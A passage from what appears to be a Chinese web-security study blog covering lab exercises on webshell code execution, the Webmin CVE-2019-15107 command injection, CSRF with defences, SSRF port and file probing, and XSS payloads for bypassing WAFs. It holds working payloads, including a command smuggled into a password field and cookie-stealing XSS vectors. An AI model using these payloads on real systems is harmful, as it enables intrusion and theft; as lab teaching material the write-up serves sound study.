src="/2023/10/13/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-030/7.png"></p><h3 id="mozhe"><a href="#mozhe" class="headerlink" title="mozhe"></a><font size="5"><strong>mozhe</strong></font></h3><p>PHP代码分析溯源(第4题)</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php     echo<span class="token punctuation">(</span>gzinflate<span class="token punctuation">(</span>base64_decode<span class="token punctuation">(</span><span class="token string">"&amp;40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&amp;"</span><span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span></code></pre><p><img src="/2023/10/13/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-030/8.png"></p><p>靶场源代码</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php     eval<span class="token punctuation">(</span>gzinflate<span class="token punctuation">(</span>base64_decode<span class="token punctuation">(</span><span class="token string">"&amp;40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&amp;"</span><span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span></code></pre><p><img src="/2023/10/13/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-030/9.png"></p><p><strong>说明：</strong>本来这是一个代码执行的漏洞但是由于代码含有echo <code>调用了系统命令而前面的echo正好将后面的 echo </code>打印出来，所以也就成一个代码执行漏洞变成了一个系统执行漏洞。<br>解码之后的代码也就是这样</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php     eval<span class="token punctuation">(</span>echo <span class="token variable"><span class="token variable">`</span>$_REQUEST<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token variable">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span></code></pre><h3 id="webadmin"><a href="#webadmin" class="headerlink" title="webadmin"></a><font size="5"><strong>webadmin</strong></font></h3><p><a href="https://vulhub.org/#/environments/webmin/CVE-2019-15107/">https://vulhub.org/#/environments/webmin/CVE-2019-15107/</a></p><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> /opt/vulhub/vulhub-master/webmin/CVE-2019-15107docker-compose up -d</code></pre><p><img src="/2023/10/13/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-030/10.png"></p><p>root&#x2F;webmin<br><img src="/2023/10/13/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-030/11.png"></p><pre class=" language-bash"><code class="language-bash">POST /password_change.cgi HTTP/1.1Host: 10.1.1.7:10000Cookie: redirect<span class="token operator">=</span>1<span class="token punctuation">;</span> testing<span class="token operator">=</span>1<span class="token punctuation">;</span> sessiontest<span class="token operator">=</span>1<span class="token punctuation">;</span> sid<span class="token operator">=</span>xContent-Length: 60Cache-Control: max-age<span class="token operator">=</span>0Sec-Ch-Ua: <span class="token string">"Chromium"</span><span class="token punctuation">;</span>v<span class="token operator">=</span><span class="token string">"92"</span>, <span class="token string">" Not A;Brand"</span><span class="token punctuation">;</span>v<span class="token operator">=</span><span class="token string">"99"</span>, <span class="token string">"Google Chrome"</span><span class="token punctuation">;</span>v<span class="token operator">=</span><span class="token string">"92"</span>Sec-Ch-Ua-Mobile: ?0Upgrade-Insecure-Requests: 1Origin: https://10.1.1.7:10000Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/92.0.4515.131 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,image/avif,image/webp,image/apng,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,application/signed-exchange<span class="token punctuation">;</span>v<span class="token operator">=</span>b3<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentReferer: https://10.1.1.7:10000/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9Connection: closeuser<span class="token operator">=</span>rootxx<span class="token operator">&amp;</span>pam<span class="token operator">=</span><span class="token operator">&amp;</span>expired<span class="token operator">=</span>2<span class="token operator">&amp;</span>old<span class="token operator">=</span>test<span class="token operator">|</span><span class="token function">id</span><span class="token operator">&amp;</span>new1<span class="token operator">=</span>test2<span class="token operator">&amp;</span>new2<span class="token operator">=</span>test2</code></pre><p><img src="/2023/10/13/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-030/12.png"></p><h3 id="php敏感函数"><a href="#php敏感函数" class="headerlink" title="php敏感函数"></a><font size="5"><strong>php敏感函数</strong></font></h3><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a><font size="5"><strong>演示案例：</strong></font></h3><p>● 墨者靶场黑盒功能点命令执行-应用功能<br>● 墨者靶场白盒代码及命令执行-代码分析<br>● 墨者靶场黑盒层 RCE 漏洞检测-公开漏洞<br>● Javaweb-Struts2 框架类 RCE 漏洞-漏洞层面<br>● 一句话 Webshell 后门原理代码执行-拓展说明  </p><h3 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a><font size="5"><strong>涉及资源</strong></font></h3><pre class=" language-bash"><code class="language-bash">https://www.cnblogs.com/ermei/p/6689005.htmlhttp://blog.leanote.com/post/snowming/9da184ef24bdhttps://www.mozhe.cn/bug/detail/T0YyUmZRa1paTkJNQ0JmVWt3Sm13dz09bW96aGUmozhehttps://www.mozhe.cn/bug/detail/RWpnQUllbmNaQUVndTFDWGxaL0JjUT09bW96aGUmozhehttps://www.mozhe.cn/bug/detail/d01lL2RSbGEwZUNTeThVZ0xDdXl0Zz09bW96aGUmozhe</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-029</title>
      <link href="/2023/10/12/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-029/"/>
      <url>/2023/10/12/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-029/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-CSRF及SSRF漏洞案例讲解"><a href="#WEB漏洞-CSRF及SSRF漏洞案例讲解" class="headerlink" title="WEB漏洞-CSRF及SSRF漏洞案例讲解"></a><font size="6"><strong>WEB漏洞-CSRF及SSRF漏洞案例讲解</strong></font></h2><span id="more"></span><h3 id="一、CSRF漏洞"><a href="#一、CSRF漏洞" class="headerlink" title="一、CSRF漏洞"></a><font size="5"><strong>一、CSRF漏洞</strong></font></h3><p><img src="/2023/10/12/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-029/1.png"></p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#CSRF 漏洞解释，原理等</span><span class="token comment" spellcheck="true">#CSRF 漏洞检测，案例，防御等</span><span class="token comment" spellcheck="true">#防御方案</span>1、当用户发送重要的请求时需要输入原始密码2、设置随机 Token3、检验 referer 来源，请求时判断请求链接是否为当前管理员正在使用的页面（管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）4、设置验证码5、限制请求方式只能为 POST</code></pre><h4 id="pikachu上csrf验证"><a href="#pikachu上csrf验证" class="headerlink" title="pikachu上csrf验证"></a><font size="4"><strong>pikachu上csrf验证</strong></font></h4><p><img src="/2023/10/12/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-029/2.png"></p><p>抓包<br><img src="/2023/10/12/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-029/3.png"></p><p>看到的是get提交的数据包&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;gg&amp;phonenum&#x3D;1111&amp;add&#x3D;11111&amp;email&#x3D;111111&amp;submit&#x3D;submit也就是说可以这样直接伪造提交的数据包从而就该服务器内容。</p><p>发送数据包<a href="http://10.1.1.7/vul/csrf/csrfget/csrf_get_edit.php?sex=22&phonenum=2222222&add=222222&email=22222222&submit=submit">http://10.1.1.7/vul/csrf/csrfget/csrf_get_edit.php?sex=22&amp;phonenum=2222222&amp;add=222222&amp;email=22222222&amp;submit=submit</a><br><img src="/2023/10/12/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-029/4.png"></p><p>伪造服务器点击<script src="http://10.1.1.7/vul/csrf/csrfget/csrf_get_edit.php?sex=33&phonenum=3333333&add=333333&email=33333333&submit=submit"></script><br><img src="/2023/10/12/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-029/5.png"></p><h4 id="burpsuit-生成Poc"><a href="#burpsuit-生成Poc" class="headerlink" title="burpsuit 生成Poc"></a><font size="4"><strong>burpsuit 生成Poc</strong></font></h4><p><img src="/2023/10/12/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-029/6.png"><br><img src="/2023/10/12/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-029/7.png"></p><p>复制poc代码修改表单中的内容。然后放在服务器当中访问如修改为以下代码</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>html<span class="token operator">></span>  <span class="token operator">&lt;</span><span class="token operator">!</span>-- CSRF PoC - generated by Burp Suite Professional --<span class="token operator">></span>  <span class="token operator">&lt;</span>body<span class="token operator">></span>  <span class="token operator">&lt;</span>script<span class="token operator">></span>history.pushState<span class="token punctuation">(</span><span class="token string">''</span>, <span class="token string">''</span>, <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span>    <span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string">"http://10.1.1.7/vul/csrf/csrfget/csrf_get_edit.php"</span><span class="token operator">></span>      <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"sex"</span> value<span class="token operator">=</span><span class="token string">"@"</span> /<span class="token operator">></span>      <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"phonenum"</span> value<span class="token operator">=</span><span class="token string">"@@@@1"</span> /<span class="token operator">></span>      <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"add"</span> value<span class="token operator">=</span><span class="token string">"@@@@@@1"</span> /<span class="token operator">></span>      <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"email"</span> value<span class="token operator">=</span><span class="token string">"@@@@@1"</span> /<span class="token operator">></span>      <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"submit"</span> value<span class="token operator">=</span><span class="token string">"submit"</span> /<span class="token operator">></span>      <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"submit"</span> value<span class="token operator">=</span><span class="token string">"Submit request"</span> /<span class="token operator">></span>    <span class="token operator">&lt;</span>/form<span class="token operator">></span>  <span class="token operator">&lt;</span>/body<span class="token operator">></span><span class="token operator">&lt;</span>/html<span class="token operator">></span></code></pre><p><img src="/2023/10/12/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-029/8.png"><br><img src="/2023/10/12/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-029/9.png"></p><h4 id="csrf防护"><a href="#csrf防护" class="headerlink" title="csrf防护"></a><font size="4"><strong>csrf防护</strong></font></h4><pre class=" language-bash"><code class="language-bash">1、当用户发送重要的请求时需要输入原始密码2、设置随机 Token3、检验 referer 来源，请求时判断请求链接是否为当前管理员正在使用的页面（管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）4、设置验证码5、限制请求方式只能为 POST</code></pre><h4 id="token防护"><a href="#token防护" class="headerlink" title="token防护"></a><font size="4"><strong>token防护</strong></font></h4><pre class=" language-bash"><code class="language-bash">GET /vul/csrf/csrftoken/token_get_edit.php?sex<span class="token operator">=</span>gg<span class="token operator">&amp;</span>phonenum<span class="token operator">=</span>1111<span class="token operator">&amp;</span>add<span class="token operator">=</span>11111<span class="token operator">&amp;</span>email<span class="token operator">=</span>11111<span class="token operator">&amp;</span>token<span class="token operator">=</span>45096611500a646562638549385<span class="token operator">&amp;</span>submit<span class="token operator">=</span>submit HTTP/1.1Host: 10.1.1.7Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/92.0.4515.131 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,image/avif,image/webp,image/apng,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,application/signed-exchange<span class="token punctuation">;</span>v<span class="token operator">=</span>b3<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9Referer: http://10.1.1.7/vul/csrf/csrftoken/token_get_edit.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9Cookie: PHPSESSID<span class="token operator">=</span>p9f3jfbnbc7cucobc9djsukon3Connection: close</code></pre><p>从上面可以看到的是token随机字符串用来验证数据包的唯一性，由于数据包的唯一性也就导致csrf漏洞几乎不能被利用</p><h4 id="referer"><a href="#referer" class="headerlink" title="referer"></a><font size="4"><strong>referer</strong></font></h4><pre class=" language-bash"><code class="language-bash">GET /vul/csrf/csrfget/csrf_get_edit.php?sex<span class="token operator">=</span>%40<span class="token operator">&amp;</span>phonenum<span class="token operator">=</span>%40%40%40%401<span class="token operator">&amp;</span>add<span class="token operator">=</span>%40%40%40%40%40%401<span class="token operator">&amp;</span>email<span class="token operator">=</span>%40%40%40%40%401<span class="token operator">&amp;</span>submit<span class="token operator">=</span>submit HTTP/1.1Host: 10.1.1.7Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/92.0.4515.131 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,image/avif,image/webp,image/apng,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,application/signed-exchange<span class="token punctuation">;</span>v<span class="token operator">=</span>b3<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9Referer: http://10.1.1.6/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9Cookie: PHPSESSID<span class="token operator">=</span>p9f3jfbnbc7cucobc9djsukon3Connection: closeGET /vul/csrf/csrftoken/token_get_edit.php?sex<span class="token operator">=</span>gg<span class="token operator">&amp;</span>phonenum<span class="token operator">=</span>18428312222<span class="token operator">&amp;</span>add<span class="token operator">=</span>1111111111111<span class="token operator">&amp;</span>email<span class="token operator">=</span>857920461%40qq.com<span class="token operator">&amp;</span>token<span class="token operator">=</span>15916611501d79dd97514223645<span class="token operator">&amp;</span>submit<span class="token operator">=</span>submit HTTP/1.1Host: 10.1.1.7Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/92.0.4515.131 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,image/avif,image/webp,image/apng,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,application/signed-exchange<span class="token punctuation">;</span>v<span class="token operator">=</span>b3<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9Referer: http://10.1.1.7/vul/csrf/csrftoken/token_get_edit.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9Cookie: PHPSESSID<span class="token operator">=</span>p9f3jfbnbc7cucobc9djsukon3Connection: close</code></pre><p>可以看到的是上面两个数据包referer来源是不一样的也就是说可以通过这样的方式来防止csrf漏洞，但是这种方式是不安全的因为可以通过抓包的方式修改referer值。</p><h3 id="二、SSRF"><a href="#二、SSRF" class="headerlink" title="二、SSRF"></a><font size="5"><strong>二、SSRF</strong></font></h3><p>原理：<a href="https://www.cnblogs.com/happystudyhuan/p/11802961.html">https://www.cnblogs.com/happystudyhuan/p/11802961.html</a></p><pre class=" language-bash"><code class="language-bash">SSRF漏洞介绍：　　SSRF漏洞（服务器端请求伪造）：是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。 SSRF漏洞原理：　　SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。SSRF是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。 SSRF漏洞利用手段：　　1.可以对外网、内网、本地进行端口扫描，某些情况下端口的Banner会回显出来（比如3306的）；　　2.攻击运行在内网或本地的有漏洞程序（比如溢出）；　　3.可以对内网Web应用进行指纹识别，原理是通过请求默认的文件得到特定的指纹；　　4.攻击内网或外网有漏洞的Web应用；　　5.使用file：///协议读取本地文件<span class="token punctuation">(</span>或其他协议）　　http://www.xingkonglangzi.com/ssrf.php?url<span class="token operator">=</span>192.168.1.10:3306　　http://www.xingkonglangzi.com/ssrf.php?url<span class="token operator">=</span>file:///c:/windows/win.ini SSRF漏洞出现点：　　1.分享：通过URL地址分享网页内容　　　　　　　　　　　　　　　　　　　　　　　　　　　　2.转码服务（通过URL地址把原地址的网页内容调优，使其适合手机屏幕的浏览）　　3.在线翻译　　4.图片加载与下载：通过URL地址加载或下载图片　　5.图片、文章收藏功能　　6.未公开的api实现及调用URL的功能　　7.从URL关键字中寻找</code></pre><p><img src="/2023/10/12/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-029/10.png"><br><img src="/2023/10/12/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-029/11.png"></p><h4 id="pikachu-ssrf漏洞验证"><a href="#pikachu-ssrf漏洞验证" class="headerlink" title="pikachu ssrf漏洞验证"></a><font size="4"><strong>pikachu ssrf漏洞验证</strong></font></h4><p>第一步正常打开ssrf页面<br><img src="/2023/10/12/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-029/12.png"><br><img src="/2023/10/12/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-029/13.png"><br><img src="/2023/10/12/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-029/14.png"></p><p>可以看到的是链接已经发生了变化<a href="http://10.1.1.7/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/vul/ssrf/ssrf_info/info1.php">http://10.1.1.7/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/vul/ssrf/ssrf_info/info1.php</a></p><p>第二步：我们可以把 url 中的内容改成内网的其他服务器上地址和端口，探测内网的其他信息，比如端口开放情况，下面这个例子就探测出10.1.1.7这台机器开放了3306端口<br><img src="/2023/10/12/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-029/15.png"></p><h4 id="SSRF（file-get-content）"><a href="#SSRF（file-get-content）" class="headerlink" title="SSRF（file_get_content）"></a><font size="4"><strong>SSRF（file_get_content）</strong></font></h4><p><img src="/2023/10/12/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-029/16.png"><br><img src="/2023/10/12/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-029/17.png"><br><img src="/2023/10/12/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-029/18.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-028</title>
      <link href="/2023/10/11/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-028/"/>
      <url>/2023/10/11/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-028/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-XSS跨站之WAF绕过及安全修复"><a href="#WEB漏洞-XSS跨站之WAF绕过及安全修复" class="headerlink" title="WEB漏洞-XSS跨站之WAF绕过及安全修复"></a><font size="6"><strong>WEB漏洞-XSS跨站之WAF绕过及安全修复</strong></font></h2><span id="more"></span><p><img src="/2023/10/11/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-028/1.png"></p><h3 id="一、常规-WAF-绕过思路"><a href="#一、常规-WAF-绕过思路" class="headerlink" title="一、常规 WAF 绕过思路"></a><font size="5"><strong>一、常规 WAF 绕过思路</strong></font></h3><pre class=" language-bash"><code class="language-bash">标签语法替换 特殊符号干扰 提交方式更改 垃圾数据溢出 加密解密算法 结合其他漏洞绕过  </code></pre><h4 id="安全狗waf"><a href="#安全狗waf" class="headerlink" title="安全狗waf"></a><font size="4"><strong>安全狗waf</strong></font></h4><p><img src="/2023/10/11/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-028/2.png"><br><img src="/2023/10/11/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-028/3.png"></p><h3 id="一、常见waf过滤的标签"><a href="#一、常见waf过滤的标签" class="headerlink" title="一、常见waf过滤的标签"></a><font size="5"><strong>一、常见waf过滤的标签</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>  <span class="token operator">&lt;</span>a<span class="token operator">></span>  <span class="token operator">&lt;</span>p<span class="token operator">></span>  <span class="token operator">&lt;</span>img<span class="token operator">></span>  <span class="token operator">&lt;</span>body<span class="token operator">></span> <span class="token operator">&lt;</span>button<span class="token operator">></span>  <span class="token operator">&lt;</span>var<span class="token operator">></span>  <span class="token operator">&lt;</span>div<span class="token operator">></span>  <span class="token operator">&lt;</span>iframe<span class="token operator">></span>  <span class="token operator">&lt;</span>object<span class="token operator">></span> <span class="token operator">&lt;</span>input<span class="token operator">></span> <span class="token operator">&lt;</span>textarea<span class="token operator">></span>  <span class="token operator">&lt;</span>keygen<span class="token operator">></span> <span class="token operator">&lt;</span>frameset<span class="token operator">></span>  <span class="token operator">&lt;</span>embed<span class="token operator">></span>  <span class="token operator">&lt;</span>svg<span class="token operator">></span>  <span class="token operator">&lt;</span>math<span class="token operator">></span>  <span class="token operator">&lt;</span>video<span class="token operator">></span>  <span class="token operator">&lt;</span>audio<span class="token operator">></span> <span class="token operator">&lt;</span>select<span class="token operator">></span></code></pre><h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a><font size="4"><strong>绕过方法</strong></font></h4><pre class=" language-bash"><code class="language-bash">可以弹窗的：alert，prompt ，confirm，base64加密，编码绕过（安全狗都没有过滤）绕过方法有很多比如：大小写绕过javascript伪协议没有分号FlashHTML5 新标签Fuzz进行测试双层标签绕过</code></pre><h4 id="audio标签"><a href="#audio标签" class="headerlink" title="audio标签"></a><font size="4"><strong>audio标签</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>audio src<span class="token operator">=</span>x onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>47<span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span>audio src<span class="token operator">=</span>x onerror<span class="token operator">=</span>prompt<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token operator">&lt;</span>audio src<span class="token operator">=</span>1 href<span class="token operator">=</span>1 onerror<span class="token operator">=</span><span class="token string">"javascript:alert(1)"</span><span class="token operator">></span><span class="token operator">&lt;</span>/audio<span class="token operator">></span></code></pre><h4 id="video标签"><a href="#video标签" class="headerlink" title="video标签"></a><font size="4"><strong>video标签</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>video src<span class="token operator">=</span>x onerror<span class="token operator">=</span>prompt<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token operator">&lt;</span>video src<span class="token operator">=</span>x onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>48<span class="token punctuation">)</span><span class="token operator">></span></code></pre><h4 id="div标签"><a href="#div标签" class="headerlink" title="div标签"></a><font size="4"><strong>div标签</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token string">"width:expression(alert(/1/))"</span><span class="token operator">></span>1<span class="token operator">&lt;</span>/div<span class="token operator">></span>     ie浏览器执行<span class="token operator">&lt;</span>div onmouseover%3d<span class="token string">'alert%26lpar%3b1%26rpar%3b'</span><span class="token operator">></span>DIV<span class="token operator">&lt;</span>%2fdiv<span class="token operator">></span>   url编码绕过</code></pre><h4 id="math标签"><a href="#math标签" class="headerlink" title="math标签"></a><font size="4"><strong>math标签</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>math<span class="token operator">></span><span class="token operator">&lt;</span>a/xlink:href<span class="token operator">=</span>javascript:prompt<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span>Xss<span class="token operator">&lt;</span>math href<span class="token operator">=</span><span class="token string">"javascript:javascript:alert(1)"</span><span class="token operator">></span>Xss<span class="token operator">&lt;</span>/math<span class="token operator">></span></code></pre><h4 id="button标签"><a href="#button标签" class="headerlink" title="button标签"></a><font size="4"><strong>button标签</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>button onfocus<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span> autofocus<span class="token operator">></span><span class="token operator">&lt;</span>button/onclick<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span> <span class="token operator">></span>xss<span class="token operator">&lt;</span>/button<span class="token operator">></span></code></pre><h4 id="keygen标签"><a href="#keygen标签" class="headerlink" title="keygen标签"></a><font size="4"><strong>keygen标签</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>keygen/onfocus<span class="token operator">=</span>prompt<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token operator">&lt;</span>keygen onfocus<span class="token operator">=</span>javascript:alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span> autofocus<span class="token operator">></span></code></pre><h4 id="object标签"><a href="#object标签" class="headerlink" title="object标签"></a><font size="4"><strong>object标签</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>object data<span class="token operator">=</span><span class="token string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="</span><span class="token operator">></span><span class="token operator">&lt;</span>/object<span class="token operator">></span>base64加密：PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg          解码：<span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre><h4 id="iframe标签"><a href="#iframe标签" class="headerlink" title="iframe标签"></a><font size="4"><strong>iframe标签</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>IFRAME width%3d<span class="token string">"420"</span> height%3d<span class="token string">"315"</span> frameborder%3d<span class="token string">"0"</span> onload%3d<span class="token string">"alert(document.cookie)"</span><span class="token operator">></span><span class="token operator">&lt;</span>%2fIFRAME<span class="token operator">></span><span class="token operator">&lt;</span>iframe%2fsrc%3d<span class="token string">"data%3atext%2fhtml%3b%26Tab%3bbase64%26Tab%3b,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg%3d%3d"</span><span class="token operator">></span><span class="token operator">&lt;</span>iframe srcdoc%3d<span class="token string">'%26lt%3bbody onload%3dprompt%26lpar%3b1%26rpar%3b%26gt%3b'</span><span class="token operator">></span></code></pre><p><img src="/2023/10/11/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-028/4.png"></p><h3 id="三、xssfuzz在线fuzz工具"><a href="#三、xssfuzz在线fuzz工具" class="headerlink" title="三、xssfuzz在线fuzz工具"></a><font size="5"><strong>三、xssfuzz在线fuzz工具</strong></font></h3><p><a href="https://xssfuzzer.com/fuzzer.html">https://xssfuzzer.com/fuzzer.html</a><br><img src="/2023/10/11/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-028/5.png"></p><h3 id="四、自动化工具说明"><a href="#四、自动化工具说明" class="headerlink" title="四、自动化工具说明"></a><font size="5"><strong>四、自动化工具说明</strong></font></h3><pre class=" language-bash"><code class="language-bash">XSStrike 主要特点反射和 DOM XSS 扫描多线程爬虫Context 分析可配置的核心检测和规避 WAF老旧的 JS 库扫描智能 payload 生成器手工制作的 HTML <span class="token operator">&amp;</span> JavaScript 解析器强大的 fuzzing 引擎盲打 XSS 